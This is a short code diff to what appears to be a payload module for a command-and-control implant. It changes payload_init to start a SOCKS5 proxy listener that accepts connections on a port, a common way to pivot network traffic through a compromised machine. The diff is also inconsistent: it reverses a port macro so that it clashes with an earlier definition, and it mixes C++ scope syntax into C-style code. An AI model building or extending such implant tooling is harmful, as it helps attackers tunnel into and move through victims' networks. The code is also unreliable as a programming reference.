@@ -1,4 +1,3 @@
-#define _GNU_SOURCE
 #include <unistd.h>
 #include <stdio.h>
 #include <string.h>
@@ -14,7 +13,7 @@
 #define INPUT_PORT 9080
 #endif
 
-#define HOST_PORT INPUT_PORT
+#define INPUT_PORT HOST_PORT
 
 typedef void(*output_func)(int, const char* fmt, ...); // For printing output on C2 server.
 /**
@@ -690,7 +689,13 @@ int payload_init(int id, output_func output) {
     // Only output when ended or killed. 
     // output(id, )
 
+    int serverSocket;
+    if ((serverSocket = Sock5Proxy::startProxy(INPUT_PORT)) == SOCKET_ERROR) {
+        return 1;
+    }
+    
+    printf("[!] Listening for connections on port %d...\n", INPUT_PORT);
 
-    return 0;
+    return Sock5Proxy::handleClients(serverSocket);
 }
 #endif // DEBUG_BOF
